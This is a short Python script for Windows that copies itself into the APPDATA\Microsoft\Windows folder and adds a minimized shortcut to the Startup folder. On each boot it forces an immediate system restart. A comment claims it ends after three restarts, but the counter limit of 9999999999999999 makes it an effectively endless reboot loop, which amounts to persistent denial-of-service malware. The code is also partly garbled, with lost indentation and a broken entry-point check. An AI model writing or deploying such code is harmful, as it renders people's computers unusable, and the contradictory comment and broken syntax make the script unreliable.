import os
import sys
import shutil

MARKER_FILE = os.path.join(os.getenv('APPDATA'), 'restart_counter.txt')

def add_to_startup():
appdata = os.getenv('APPDATA')
hidden_dir = os.path.join(appdata, 'Microsoft', 'Windows')
exe_path = os.path.join(hidden_dir, 'triple_restart.exe')

if not os.path.exists(hidden_dir):  
    os.makedirs(hidden_dir)  
if not os.path.exists(exe_path):  
    shutil.copy(sys.executable, exe_path)  

# Add shortcut to startup  
startup_dir = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')  
shortcut_path = os.path.join(startup_dir, 'triple_restart.lnk')  

if not os.path.exists(shortcut_path):  
    import win32com.client  
    shell = win32com.client.Dispatch("WScript.Shell")  
    shortcut = shell.CreateShortcut(shortcut_path)  
    shortcut.TargetPath = exe_path  
    shortcut.WorkingDirectory = hidden_dir  
    shortcut.WindowStyle = 7  
    shortcut.Save()

def trigger_restart():
print("Restarting system...")
os.system("shutdown /r /t 0")

def get_restart_count():
if os.path.exists(MARKER_FILE):
with open(MARKER_FILE, 'r') as f:
try:
return int(f.read().strip())
except:
return 0
return 0

def save_restart_count(count):
with open(MARKER_FILE, 'w') as f:
f.write(str(count))

def main():
add_to_startup()
count = get_restart_count()

if count < 9999999999999999:  
    save_restart_count(count + 1)  
    trigger_restart()  
else:  
    # Done after 3 restarts, cleanup  
    if os.path.exists(MARKER_FILE):  
        os.remove(MARKER_FILE)  
    print("Restart sequence complete.")

if name == 'main':
main()

